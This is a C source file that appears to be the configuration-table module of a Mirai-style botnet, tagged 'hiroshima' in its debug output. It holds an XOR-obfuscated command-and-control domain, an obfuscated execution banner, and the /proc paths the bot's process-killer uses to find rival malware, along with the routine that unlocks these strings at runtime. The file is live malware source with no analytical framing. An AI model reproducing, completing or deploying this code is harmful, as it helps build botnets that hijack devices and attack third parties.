#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeaddaad;

struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	add_entry(TABLE_CNC_DOMAIN, "\x66\x6B\x70\x6A\x61\x70\x36\x2A\x74\x77\x77\x67\x67\x2A\x67\x6A\x04", 17);
    add_entry(TABLE_EXEC_SUCCESS, "\x71\x6A\x77\x70\x65\x66\x68\x61\x5B\x6D\x77\x5B\x70\x6C\x61\x5B\x6C\x6D\x77\x70\x6B\x76\x7D\x5B\x6B\x62\x5B\x71\x6A\x6D\x72\x61\x76\x77\x61\x04", 36);
    
    add_entry(TABLE_KILLER_PROC, "\x2B\x74\x76\x6B\x67\x2B\x04", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x2B\x61\x7C\x61\x04", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x2B\x62\x60\x04", 4); // /fd
    add_entry(TABLE_KILLER_CMDLINE, "\x2B\x67\x69\x60\x68\x6D\x6A\x61\x04", 9); // /cmdline

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[hiroshima/table] tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[hiroshima/table] tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[hiroshima/table] tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
